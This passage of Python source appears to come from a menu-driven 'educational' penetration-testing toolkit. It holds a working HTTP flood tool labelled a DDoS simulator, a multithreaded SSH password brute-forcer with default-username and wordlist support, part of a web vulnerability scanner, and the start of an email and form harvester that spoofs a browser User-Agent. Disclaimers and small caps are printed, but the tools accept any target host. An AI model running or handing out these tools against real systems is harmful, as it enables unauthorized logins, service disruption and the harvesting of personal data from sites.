        found_files = []
        
        for path in sensitive_paths:
            try:
                test_url = f"{target_url}{path}"
                response = requests.get(test_url, timeout=5)
                
                if response.status_code == 200:
                    if cli_manager.enable_rich and RICH_AVAILABLE:
                        cli_manager.console.print(f"\n[red]⚠️  Found sensitive file: {path}[/red]")
                    else:
                        print(f"\n⚠️  Found sensitive file: {path}")
                    found_files.append(path)
                    scan_results['information_disclosure'].append({
                        'path': path,
                        'url': test_url,
                        'evidence': f"File accessible with status {response.status_code}"
                    })
                
            except Exception as e:
                continue
        
        # Check for server information in headers
        try:
            response = requests.get(target_url, timeout=5)
            headers = response.headers
            
            sensitive_headers = ['server', 'x-powered-by', 'x-aspnet-version', 'x-php-version']
            for header in sensitive_headers:
                if header in headers:
                    if cli_manager.enable_rich and RICH_AVAILABLE:
                        cli_manager.console.print(f"\n[red]⚠️  Information disclosure in header '{header}': {headers[header]}[/red]")
                    else:
                        print(f"\n⚠️  Information disclosure in header '{header}': {headers[header]}")
                    scan_results['information_disclosure'].append({
                        'type': 'header',
                        'header': header,
                        'value': headers[header],
                        'evidence': "Sensitive header information exposed"
                    })
        
        except Exception as e:
            pass
        
        if found_files:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"\n[green]✅ Found {len(found_files)} potentially sensitive files[/green]")
            else:
                print(f"\n✅ Found {len(found_files)} potentially sensitive files")
        else:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"\n[green]✅ No obvious information disclosure vulnerabilities detected[/green]")
            else:
                print("✅ No obvious information disclosure vulnerabilities detected")
    
    # Run selected scans
    try:
        if choice == "1":
            test_sql_injection()
        elif choice == "2":
            test_xss()
        elif choice == "3":
            test_file_upload()
        elif choice == "4":
            test_directory_traversal()
        elif choice == "5":
            test_information_disclosure()
        elif choice == "6":
            test_sql_injection()
            test_xss()
            test_file_upload()
            test_directory_traversal()
            test_information_disclosure()
        else:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print("[red]Invalid choice.[/red]")
            else:
                print("Invalid choice.")
            return
        
        # Generate comprehensive report
        report_content = f"""
Enhanced Web Vulnerability Scan Report
======================================
Target URL: {target_url}
Scan Type: {choice}
Timestamp: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Scan Results:
- SQL Injection Vulnerabilities: {len(scan_results['sql_injection'])}
- XSS Vulnerabilities: {len(scan_results['xss'])}
- File Upload Vulnerabilities: {len(scan_results['file_upload'])}
- Directory Traversal Vulnerabilities: {len(scan_results['directory_traversal'])}
- Information Disclosure Vulnerabilities: {len(scan_results['information_disclosure'])}

Detailed Findings:
{chr(10).join([f'- {vuln["evidence"]} ({vuln["url"]})' for vuln in scan_results['sql_injection']])}
{chr(10).join([f'- {vuln["evidence"]} ({vuln["url"]})' for vuln in scan_results['xss']])}
{chr(10).join([f'- {vuln["evidence"]} ({vuln["url"]})' for vuln in scan_results['file_upload']])}
{chr(10).join([f'- {vuln["evidence"]} ({vuln["url"]})' for vuln in scan_results['directory_traversal']])}
{chr(10).join([f'- {vuln["evidence"]} ({vuln["url"]})' for vuln in scan_results['information_disclosure']])}
        """
        
        report_file = save_report(report_content.strip(), "enhanced_web_vuln_scan")
        if report_file:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"\n[green]Report saved: {report_file}[/green]")
            else:
                print(f"\nReport saved: {report_file}")
        
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("\n[green]✅ Enhanced web vulnerability scan completed[/green]")
        else:
            print("\n✅ Enhanced web vulnerability scan completed")
        
    except KeyboardInterrupt:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("\n[yellow]⚠️  Scan interrupted by user[/yellow]")
        else:
            print("\n⚠️  Scan interrupted by user")
    except Exception as e:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"\n[red]❌ Scan error: {e}[/red]")
        else:
            print(f"\n❌ Scan error: {e}")


def ddos_simulator():
    """Enhanced DDoS simulation tool with thread-controlled load testing and safety features."""
    if RICH_AVAILABLE:
        console = Console()
        console.print(Panel.fit("[bold blue]Enhanced DDoS Simulator[/bold blue]", border_style="blue"))
        console.print("[bold red]⚠️  WARNING: This tool is for educational purposes and local testing only.[/bold red]")
        console.print("[bold red]Do not use against any systems without explicit permission.[/bold red]")
        console.print("[bold red]This tool creates a controlled testing environment with safety limits.[/bold red]")
    else:
        print("\n[Enhanced DDoS Simulator]")
        print("⚠️  WARNING: This tool is for educational purposes and local testing only.")
        print("Do not use against any systems without explicit permission.")
        print("This tool creates a controlled testing environment with safety limits.")
    
    # Check if required libraries are available
    try:
        import flask
        from flask_socketio import SocketIO
    except ImportError:
        print("❌ Required libraries not found.")
        print("Please install: pip install flask flask-socketio aiohttp")
        return
    
    # Check if required libraries are available
    try:
        import flask
        from flask_socketio import SocketIO
    except ImportError:
        if RICH_AVAILABLE:
            console.print("[red]❌ Required libraries not found.[/red]")
            console.print("Please install: pip install flask flask-socketio aiohttp")
        else:
            print("❌ Required libraries not found.")
            print("Please install: pip install flask flask-socketio aiohttp")
        return
    
    # Enhanced simulation configuration
    if RICH_AVAILABLE:
        console.print("\n[bold cyan]Simulation Configuration:[/bold cyan]")
    else:
        print("\nSimulation Configuration:")
    
    # Target URL with validation
    target_url = safe_input("Enter target URL (default: http://localhost:8080): ")
    if not target_url:
        target_url = "http://localhost:8080"
    
    # Validate URL format
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    # Enhanced client configuration with safety limits
    if RICH_AVAILABLE:
        console.print("\n[bold yellow]Safety Limits:[/bold yellow]")
        console.print("• Maximum clients: 500 (for safety)")
        console.print("• Maximum duration: 60 seconds (for safety)")
        console.print("• Maximum requests per client: 1000 (for safety)")
    else:
        print("\nSafety Limits:")
        print("• Maximum clients: 500 (for safety)")
        print("• Maximum duration: 60 seconds (for safety)")
        print("• Maximum requests per client: 1000 (for safety)")
    
    num_clients_input = safe_input("Enter number of concurrent clients (default: 50, max: 500): ")
    if not num_clients_input:
        num_clients = 50
    else:
        try:
            num_clients = int(num_clients_input)
            if num_clients <= 0 or num_clients > 500:
                if RICH_AVAILABLE:
                    console.print("[red]Number of clients must be between 1 and 500 for safety.[/red]")
                else:
                    print("Number of clients must be between 1 and 500 for safety.")
                return
        except ValueError:
            if RICH_AVAILABLE:
                console.print("[red]Invalid number of clients.[/red]")
            else:
                print("Invalid number of clients.")
            return
    
    # Enhanced duration with safety limits
    run_time_input = safe_input("Enter simulation duration in seconds (default: 10, max: 60): ")
    if not run_time_input:
        run_time = 10
    else:
        try:
            run_time = int(run_time_input)
            if run_time <= 0 or run_time > 60:
                if RICH_AVAILABLE:
                    console.print("[red]Duration must be between 1 and 60 seconds for safety.[/red]")
                else:
                    print("Duration must be between 1 and 60 seconds for safety.")
                return
        except ValueError:
            if RICH_AVAILABLE:
                console.print("[red]Invalid duration.[/red]")
            else:
                print("Invalid duration.")
            return
    
    # New: Thread control and rate limiting
    max_requests_per_client = safe_input("Enter max requests per client (default: 100, max: 1000): ")
    if not max_requests_per_client:
        max_requests_per_client = 100
    else:
        try:
            max_requests_per_client = int(max_requests_per_client)
            if max_requests_per_client <= 0 or max_requests_per_client > 1000:
                if RICH_AVAILABLE:
                    console.print("[red]Max requests per client must be between 1 and 1000.[/red]")
                else:
                    print("Max requests per client must be between 1 and 1000.")
                return
        except ValueError:
            if RICH_AVAILABLE:
                console.print("[red]Invalid max requests per client.[/red]")
            else:
                print("Invalid max requests per client.")
            return
    
    # New: Request delay for rate limiting
    request_delay = safe_input("Enter delay between requests in seconds (default: 0.1, max: 1.0): ")
    if not request_delay:
        request_delay = 0.1
    else:
        try:
            request_delay = float(request_delay)
            if request_delay < 0 or request_delay > 1.0:
                if RICH_AVAILABLE:
                    console.print("[red]Request delay must be between 0 and 1.0 seconds.[/red]")
                else:
                    print("Request delay must be between 0 and 1.0 seconds.")
                return
        except ValueError:
            if RICH_AVAILABLE:
                console.print("[red]Invalid request delay.[/red]")
            else:
                print("Invalid request delay.")
            return
    
    # Ask if user wants to start local test server
    start_server = safe_input("Start local test server? (y/n, default: y): ")
    if not start_server or start_server.lower() in ('y', 'yes'):
        print("\nStarting local test server...")
        
        # Create Flask app for testing
        app = flask.Flask(__name__)
        app.config['SECRET_KEY'] = 'test_key'
        socketio = SocketIO(app)
        
        request_count = 0
        
        @app.route("/")
        def home():
            html = """
            <!doctype html>
            <html>
                <head>
                    <title>DDoS Test Server</title>
                    <script src="//cdnjs.cloudflare.com/ajax/libs/socket.io/4.6.1/socket.io.min.js"></script>
                    <style>
                        body { font-family: Arial, sans-serif; margin: 40px; }
                        .counter { font-size: 24px; font-weight: bold; color: #333; }
                        .status { color: #666; }
                    </style>
                </head>
                <body>
                    <h1>DDoS Test Server</h1>
                    <p class="status">Server is running and monitoring requests</p>
                    <p>Total requests received: <span id="counter" class="counter">0</span></p>
                    <p class="status">This server is for educational testing only</p>
                    <script type="text/javascript">
                        var socket = io();
                        socket.on('update_count', function(count) {
                            document.getElementById('counter').innerText = count;
                        });
                    </script>
                </body>
            </html>
            """
            return flask.render_template_string(html)
        
        def run_server():
            socketio.run(app, port=8080, debug=False, allow_unsafe_werkzeug=True)
        
        def increment_counter():
            nonlocal request_count
            request_count += 1
            socketio.emit('update_count', request_count)
        
        # Start server in background thread
        server_thread = Thread(target=run_server, daemon=True)
        server_thread.start()
        
        # Give server time to start
        print("Waiting for server to start...")
        time.sleep(3)
        
        # Update the increment function for the simulation
        global_increment = increment_counter
    else:
        print("Using external target. Make sure the target is accessible.")
        global_increment = lambda: None
    
    # Display simulation configuration
    if RICH_AVAILABLE:
        config_table = Table(title="Simulation Configuration")
        config_table.add_column("Parameter", style="cyan", no_wrap=True)
        config_table.add_column("Value", style="green")
        
        config_table.add_row("Target URL", target_url)
        config_table.add_row("Concurrent Clients", str(num_clients))
        config_table.add_row("Duration", f"{run_time} seconds")
        config_table.add_row("Max Requests/Client", str(max_requests_per_client))
        config_table.add_row("Request Delay", f"{request_delay} seconds")
        config_table.add_row("Max Total Requests", str(num_clients * max_requests_per_client))
        
        console.print(config_table)
        console.print("\n[bold yellow]Starting simulation...[/bold yellow]")
    else:
        print(f"\nStarting DDoS simulation:")
        print(f"Target: {target_url}")
        print(f"Concurrent clients: {num_clients}")
        print(f"Duration: {run_time} seconds")
        print(f"Max requests per client: {max_requests_per_client}")
        print(f"Request delay: {request_delay} seconds")
        print(f"Max total requests: {num_clients * max_requests_per_client}")
        print("=" * 50)
    
    async def send_request(session, client_id):
        """Send requests from a single client with rate limiting and safety controls."""
        end_time = time.time() + run_time
        requests_sent = 0
        
        while time.time() < end_time and requests_sent < max_requests_per_client:
            try:
                async with session.get(target_url) as response:
                    await response.text()
                    requests_sent += 1
                    global_increment()
                    
                    # Progress reporting
                    if requests_sent % 10 == 0:
                        if RICH_AVAILABLE:
                            console.print(f"[cyan]Client {client_id}:[/cyan] {requests_sent} requests sent")
                        else:
                            print(f"Client {client_id}: {requests_sent} requests sent")
                    
                    # Rate limiting delay
                    if request_delay > 0:
                        await asyncio.sleep(request_delay)
                        
            except Exception as e:
                if RICH_AVAILABLE:
                    console.print(f"[red]Client {client_id} error: {e}[/red]")
                else:
                    print(f"Client {client_id} error: {e}")
                break
        
        return requests_sent
    
    async def start_ddos():
        """Start the DDoS simulation."""
        start_time = time.time()
        total_requests = 0
        
        # Configure session with reasonable timeouts
        timeout = aiohttp.ClientTimeout(total=5)
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=100)
        
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            # Create tasks for all clients
            tasks = []
            for i in range(num_clients):
                task = asyncio.create_task(send_request(session, i + 1))
                tasks.append(task)
            
            # Wait for all tasks to complete
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Calculate total requests
            for result in results:
                if isinstance(result, int):
                    total_requests += result
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Enhanced results display
        if RICH_AVAILABLE:
            results_table = Table(title="Simulation Results")
            results_table.add_column("Metric", style="cyan", no_wrap=True)
            results_table.add_column("Value", style="green")
            
            results_table.add_row("Total Requests Sent", f"{total_requests:,}")
            results_table.add_row("Actual Duration", f"{duration:.2f} seconds")
            results_table.add_row("Average Requests/Second", f"{total_requests / duration:.2f}")
            results_table.add_row("Average Requests/Client", f"{total_requests / num_clients:.2f}")
            results_table.add_row("Success Rate", f"{(total_requests / (num_clients * max_requests_per_client)) * 100:.1f}%")
            
            if start_server and start_server.lower() in ('y', 'yes'):
                results_table.add_row("Requests Received by Server", f"{request_count:,}")
            
            console.print(results_table)
            
            # Performance analysis
            if total_requests > 0:
                console.print(f"\n[bold cyan]Performance Analysis:[/bold cyan]")
                if total_requests / duration > 100:
                    console.print("[green]High load achieved - Good for stress testing[/green]")
                elif total_requests / duration > 50:
                    console.print("[yellow]Moderate load achieved - Suitable for testing[/yellow]")
                else:
                    console.print("[red]Low load achieved - Consider increasing clients or reducing delay[/red]")
        else:
            print("=" * 50)
            print("Simulation Results:")
            print(f"Total requests sent: {total_requests:,}")
            print(f"Actual duration: {duration:.2f} seconds")
            print(f"Average requests per second: {total_requests / duration:.2f}")
            print(f"Average requests per client: {total_requests / num_clients:.2f}")
            print(f"Success rate: {(total_requests / (num_clients * max_requests_per_client)) * 100:.1f}%")
            
            if start_server and start_server.lower() in ('y', 'yes'):
                print(f"Requests received by test server: {request_count:,}")
    
    try:
        # Run the simulation
        asyncio.run(start_ddos())
        if RICH_AVAILABLE:
            console.print("\n[bold green]✅ Simulation completed successfully[/bold green]")
        else:
            print("\n✅ Simulation completed successfully")
    except KeyboardInterrupt:
        if RICH_AVAILABLE:
            console.print("\n[bold yellow]⚠️  Simulation interrupted by user[/bold yellow]")
        else:
            print("\n⚠️  Simulation interrupted by user")
    except Exception as e:
        if RICH_AVAILABLE:
            console.print(f"\n[bold red]❌ Simulation error: {e}[/bold red]")
        else:
            print(f"\n❌ Simulation error: {e}")
    
    if start_server and start_server.lower() in ('y', 'yes'):
        if RICH_AVAILABLE:
            console.print("\n[bold cyan]Test server is still running on http://localhost:8080[/bold cyan]")
            console.print("[yellow]Press Ctrl+C to stop the server when done testing.[/yellow]")
        else:
            print("\nTest server is still running on http://localhost:8080")
            print("Press Ctrl+C to stop the server when done testing.")


def ssh_brute_force():
    """Enhanced SSH brute force tool with thread pool and multi-username support."""
    print("\n[Enhanced SSH Brute Force Tool]")
    print("⚠️  WARNING: This tool is for educational purposes and local testing only.")
    print("Only use against systems you own or have explicit permission to test.")
    
    if not PARAMIKO_AVAILABLE:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("[red]paramiko library not available.[/red]")
            cli_manager.console.print("Install with: pip install paramiko")
        else:
            print("❌ paramiko library not available. Install with: pip install paramiko")
        return
    
    # Get target information
    target_host = safe_input("Enter target host/IP: ")
    if not target_host:
        return
    
    if not (validate_ip(target_host) or validate_hostname(target_host)):
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("[red]Invalid host/IP address.[/red]")
        else:
            print(colored("Invalid host/IP address.", Colors.FAIL))
        return
    
    target_port = safe_input("Enter SSH port (default 22): ")
    if not target_port:
        target_port = "22"
    
    if not validate_port(target_port):
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("[red]Invalid port number.[/red]")
        else:
            print(colored("Invalid port number.", Colors.FAIL))
        return
    
    # Enhanced username options
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print("\n[bold cyan]Username Options:[/bold cyan]")
        cli_manager.console.print("1. [green]Single Username[/green] - Test one specific username")
        cli_manager.console.print("2. [yellow]Username List[/yellow] - Test multiple usernames from file")
        cli_manager.console.print("3. [blue]Common Usernames[/blue] - Test common default usernames")
    else:
        print("\nUsername Options:")
        print("1. Single Username - Test one specific username")
        print("2. Username List - Test multiple usernames from file")
        print("3. Common Usernames - Test common default usernames")
    
    username_mode = safe_input("Select username mode (1-3): ")
    if not username_mode:
        return
    
    usernames = []
    
    if username_mode == "1":
        # Single username
        username = safe_input("Enter username to test: ")
        if not username:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print("[red]Username is required.[/red]")
            else:
                print(colored("Username is required.", Colors.FAIL))
            return
        usernames = [username]
        
    elif username_mode == "2":
        # Username list from file
        username_file = safe_file_input("Enter username list file path: ")
        if not username_file:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print("[red]Username file is required.[/red]")
            else:
                print(colored("Username file is required.", Colors.FAIL))
            return
        
        try:
            with open(username_file, 'r', encoding='utf-8', errors='ignore') as f:
                usernames = [line.strip() for line in f if line.strip()]
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"[green]✓ Loaded {len(usernames)} usernames from file[/green]")
            else:
                print(f"✓ Loaded {len(usernames)} usernames from file")
        except Exception as e:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"[red]Error loading username file: {e}[/red]")
            else:
                print(colored(f"Error loading username file: {e}", Colors.FAIL))
            return
            
    elif username_mode == "3":
        # Common usernames
        usernames = [
            'admin', 'root', 'user', 'test', 'guest', 'administrator',
            'operator', 'service', 'system', 'webmaster', 'manager',
            'support', 'helpdesk', 'info', 'mail', 'ftp', 'ssh',
            'mysql', 'oracle', 'postgres', 'apache', 'nginx', 'www',
            'daemon', 'bin', 'sys', 'adm', 'uucp', 'lp', 'nuucp',
            'smmsp', 'listen', 'nobody', 'noaccess', 'nobody4'
        ]
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"[green]✓ Using {len(usernames)} common usernames[/green]")
        else:
            print(f"✓ Using {len(usernames)} common usernames")
    
    else:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("[red]Invalid username mode.[/red]")
        else:
            print(colored("Invalid username mode.", Colors.FAIL))
        return
    
    # Get wordlist
    wordlist_path = safe_file_input("Enter wordlist file path: ")
    if not wordlist_path:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("[red]Wordlist file is required.[/red]")
        else:
            print(colored("Wordlist file is required.", Colors.FAIL))
        return
    
    # Load wordlist
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"[green]✓ Loaded {len(passwords)} passwords from wordlist[/green]")
        else:
            print(f"✓ Loaded {len(passwords)} passwords from wordlist")
    except Exception as e:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"[red]Error loading wordlist: {e}[/red]")
        else:
            print(colored(f"Error loading wordlist: {e}", Colors.FAIL))
        return
    
    # Thread pool configuration
    max_threads = safe_input("Enter max threads (default 10): ")
    max_threads = int(max_threads) if max_threads.isdigit() else 10
    max_threads = min(max_threads, 50)  # Cap at 50 threads
    
    # Attempt limits
    max_attempts = safe_input("Enter max attempts per username (default 1000): ")
    max_attempts = int(max_attempts) if max_attempts.isdigit() else 1000
    
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[bold green]SSH Brute Force Configuration:[/bold green]")
        cli_manager.console.print(f"[cyan]Target:[/cyan] {target_host}:{target_port}")
        cli_manager.console.print(f"[cyan]Usernames:[/cyan] {len(usernames)}")
        cli_manager.console.print(f"[cyan]Passwords:[/cyan] {len(passwords)}")
        cli_manager.console.print(f"[cyan]Max Threads:[/cyan] {max_threads}")
        cli_manager.console.print(f"[cyan]Max Attempts:[/cyan] {max_attempts}")
    else:
        print(f"\nSSH Brute Force Configuration:")
        print(f"Target: {target_host}:{target_port}")
        print(f"Usernames: {len(usernames)}")
        print(f"Passwords: {len(passwords)}")
        print(f"Max Threads: {max_threads}")
        print(f"Max Attempts: {max_attempts}")
    
    # Test SSH connection
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[yellow]Testing SSH connection to {target_host}:{target_port}...[/yellow]")
    else:
        print(f"\nTesting SSH connection to {target_host}:{target_port}...")
    
    try:
        # Test connection
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Try to connect with a dummy password to check if SSH is accessible
        try:
            ssh.connect(target_host, port=int(target_port), username=usernames[0], 
                       password="dummy", timeout=5)
        except paramiko.AuthenticationException:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print("[green]✓ SSH service is accessible (authentication failed as expected)[/green]")
            else:
                print("✓ SSH service is accessible (authentication failed as expected)")
        except Exception as e:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"[red]❌ SSH connection failed: {e}[/red]")
            else:
                print(f"❌ SSH connection failed: {e}")
            return
        
        ssh.close()
        
    except Exception as e:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"[red]❌ SSH test failed: {e}[/red]")
        else:
            print(f"❌ SSH test failed: {e}")
        return
    
    # Initialize results
    results = {
        'successful_logins': [],
        'total_attempts': 0,
        'start_time': time.time()
    }
    
    # Thread-safe counter
    from threading import Lock
    attempt_counter = {'value': 0, 'lock': Lock()}
    
    def test_credentials(username, password):
        """Test a single username/password combination."""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(target_host, port=int(target_port), username=username, 
                       password=password, timeout=5)
            
            # Successful login
            ssh.close()
            return True, username, password
            
        except paramiko.AuthenticationException:
            # Authentication failed
            return False, username, password
        except Exception as e:
            # Connection error
            return None, username, password
        finally:
            try:
                ssh.close()
            except:
                pass
    
    def worker(username, password_queue, results, attempt_counter):
        """Worker thread for testing credentials."""
        while True:
            try:
                password = password_queue.get_nowait()
            except queue.Empty:
                break
            
            # Update attempt counter
            with attempt_counter['lock']:
                attempt_counter['value'] += 1
                current_attempt = attempt_counter['value']
            
            # Check attempt limit
            if current_attempt > max_attempts:
                break
            
            # Test credentials
            success, test_username, test_password = test_credentials(username, password)
            
            if success:
                # Successful login found
                with results['lock']:
                    results['successful_logins'].append({
                        'username': test_username,
                        'password': test_password,
                        'attempts': current_attempt
                    })
                break
            
            # Rate limiting
            time.sleep(0.1)  # Small delay to avoid overwhelming the server
            
            password_queue.task_done()
    
    # Start brute force
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[bold green]Starting Enhanced SSH Brute Force Attack...[/bold green]")
    else:
        print(f"\nStarting Enhanced SSH Brute Force Attack...")
    
    import queue
    import threading
    
    # Create progress bar
    total_combinations = min(len(usernames) * len(passwords), max_attempts)
    progress = ProgressBar(total_combinations, "SSH Brute Force")
    
    # Create thread pool
    threads = []
    
    for username in usernames:
        # Create password queue for this username
        password_queue = queue.Queue()
        for password in passwords[:max_attempts//len(usernames)]:
            password_queue.put(password)
        
        # Create worker thread
        thread = threading.Thread(
            target=worker,
            args=(username, password_queue, results, attempt_counter)
        )
        threads.append(thread)
        thread.start()
        
        # Limit number of concurrent threads
        if len(threads) >= max_threads:
            break
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
    
    progress.finish()
    
    # Display results
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print(f"\n[bold green]SSH Brute Force Results:[/bold green]")
        
        if results['successful_logins']:
            table = Table(title="Successful Logins", show_header=True, header_style="bold magenta")
            table.add_column("Username", style="cyan", no_wrap=True)
            table.add_column("Password", style="green", no_wrap=True)
            table.add_column("Attempts", style="yellow", justify="right")
            
            for login in results['successful_logins']:
                table.add_row(
                    login['username'],
                    login['password'],
                    str(login['attempts'])
                )
            
            cli_manager.console.print(table)
        else:
            cli_manager.console.print(f"[red]❌ No successful logins found after {attempt_counter['value']} attempts[/red]")
        
        cli_manager.console.print(f"[cyan]Total Attempts:[/cyan] {attempt_counter['value']}")
        cli_manager.console.print(f"[cyan]Time Elapsed:[/cyan] {time.time() - results['start_time']:.2f} seconds")
        
    else:
        print(f"\nSSH Brute Force Results:")
        
        if results['successful_logins']:
            print("Successful Logins:")
            for login in results['successful_logins']:
                print(f"  Username: {login['username']}")
                print(f"  Password: {login['password']}")
                print(f"  Attempts: {login['attempts']}")
                print()
        else:
            print(f"❌ No successful logins found after {attempt_counter['value']} attempts")
        
        print(f"Total Attempts: {attempt_counter['value']}")
        print(f"Time Elapsed: {time.time() - results['start_time']:.2f} seconds")
    
    # Save comprehensive report
    report_content = f"""
Enhanced SSH Brute Force Report
===============================
Target: {target_host}:{target_port}
Username Mode: {username_mode}
Usernames Tested: {len(usernames)}
Passwords Loaded: {len(passwords)}
Max Threads: {max_threads}
Max Attempts: {max_attempts}

Results:
- Total Attempts: {attempt_counter['value']}
- Successful Logins: {len(results['successful_logins'])}
- Time Elapsed: {time.time() - results['start_time']:.2f} seconds

Successful Logins:
{chr(10).join([f'- Username: {login["username"]}, Password: {login["password"]}, Attempts: {login["attempts"]}' for login in results['successful_logins']])}

Configuration:
- Wordlist: {wordlist_path}
- Usernames: {', '.join(usernames[:10])}{'...' if len(usernames) > 10 else ''}
- Timestamp: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """
    
    report_file = save_report(report_content.strip(), "enhanced_ssh_brute_force")
    if report_file:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print(f"\n[green]Report saved: {report_file}[/green]")
        else:
            print(f"\nReport saved: {report_file}")


def web_scraper():
    """Enhanced web scraping tool with multi-page scraping and email/URL harvesting."""
    print("\n[Enhanced Web Scraper]")
    print("⚠️  WARNING: This tool is for educational purposes and authorized testing only.")
    print("Respect robots.txt and website terms of service.")
    
    if not REQUESTS_AVAILABLE or not BEAUTIFULSOUP_AVAILABLE:
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("[red]Required libraries not available.[/red]")
            cli_manager.console.print("Install with: pip install requests beautifulsoup4")
        else:
            print("❌ Required libraries not available.")
            print("Install with: pip install requests beautifulsoup4")
        return
    
    # Get target URL
    target_url = safe_input("Enter target URL: ")
    if not target_url:
        return
    
    if not validate_url(target_url):
        if cli_manager.enable_rich and RICH_AVAILABLE:
            cli_manager.console.print("[red]Invalid URL format.[/red]")
        else:
            print(colored("Invalid URL format.", Colors.FAIL))
        return
    
    # Ensure URL has protocol
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    # Enhanced scraping options
    if cli_manager.enable_rich and RICH_AVAILABLE:
        cli_manager.console.print("\n[bold cyan]Scraping Options:[/bold cyan]")
        cli_manager.console.print("1. [green]Single Page Analysis[/green] - Basic page reconnaissance")
        cli_manager.console.print("2. [yellow]Multi-Page Crawling[/yellow] - Crawl multiple pages (lab-safe)")
        cli_manager.console.print("3. [blue]Email & URL Harvesting[/blue] - Extract emails and URLs")
        cli_manager.console.print("4. [red]Comprehensive Reconnaissance[/red] - Full site analysis")
    else:
        print("\nScraping Options:")
        print("1. Single Page Analysis - Basic page reconnaissance")
        print("2. Multi-Page Crawling - Crawl multiple pages (lab-safe)")
        print("3. Email & URL Harvesting - Extract emails and URLs")
        print("4. Comprehensive Reconnaissance - Full site analysis")
    
    scraping_mode = safe_input("Select scraping mode (1-4): ")
    if not scraping_mode:
        return
    
    # Set up session with headers
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    })
    
    # Initialize data collection
    all_emails = set()
    all_urls = set()
    all_forms = []
    all_scripts = []
    all_comments = []
    crawled_pages = []
    
    def extract_emails(text):
        """Extract email addresses from text."""
        import re
        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        return re.findall(email_pattern, text)
    
    def extract_urls(soup, base_url):
        """Extract URLs from page."""
        urls = set()
        
        # Extract from links
        for link in soup.find_all('a', href=True):
            href = link['href']
            if href.startswith(('http://', 'https://')):
                urls.add(href)
            elif href.startswith('/'):
                # Resolve relative URLs
                from urllib.parse import urljoin
                urls.add(urljoin(base_url, href))
        
        # Extract from scripts
        for script in soup.find_all('script', src=True):
            src = script['src']
            if src.startswith(('http://', 'https://')):
                urls.add(src)
            elif src.startswith('/'):
                from urllib.parse import urljoin
                urls.add(urljoin(base_url, src))
        
        # Extract from CSS
        for link in soup.find_all('link', rel='stylesheet'):
            href = link.get('href')
            if href and href.startswith(('http://', 'https://')):
                urls.add(href)
            elif href and href.startswith('/'):
                from urllib.parse import urljoin
                urls.add(urljoin(base_url, href))
        
        return urls
    
    def crawl_page(url, depth=0, max_depth=2, visited=None):
        """Crawl a single page and extract information."""
        if visited is None:
            visited = set()
        
        if depth > max_depth or url in visited:
            return
        
        visited.add(url)
        
        try:
            if cli_manager.enable_rich and RICH_AVAILABLE:
                cli_manager.console.print(f"[cyan]Crawling:[/cyan] {url}")
            else:
                print(f"Crawling: {url}")
            
            response = session.get(url, timeout=10)
            response.raise_for_status()
            
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Extract emails
            page_emails = extract_emails(response.text)
            all_emails.update(page_emails)
            
            # Extract URLs
            page_urls = extract_urls(soup, url)
            all_urls.update(page_urls)
            
            # Extract forms
            forms = soup.find_all('form')
            for form in forms:
                form_info = {
                    'url': url,
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET'),
                    'inputs': []
                }
                
                for inp in form.find_all('input'):
                    form_info['inputs'].append({
                        'name': inp.get('name', ''),
                        'type': inp.get('type', 'text'),
                        'value': inp.get('value', '')
                    })
                
